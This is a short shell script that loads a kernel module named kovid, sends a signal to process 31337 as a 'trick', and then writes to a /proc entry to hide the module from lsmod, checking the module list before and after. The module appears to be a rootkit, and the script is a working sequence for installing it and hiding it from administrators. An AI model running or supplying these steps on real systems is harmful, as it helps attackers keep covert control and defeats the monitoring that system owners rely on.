#!/bin/sh

# Insert the kovid module
insmod kovid.ko

# Verify that the module is loaded
echo "Checking if kovid module is loaded:"
lsmod | grep kovid

# The kovid trick
kill -CONT 31337

# Hide the module
echo "Hiding the kovid module:"
echo -h > /proc/myprocname

# Verify that the module is hidden
echo "Checking if kovid module is hidden:"
lsmod | grep kovid
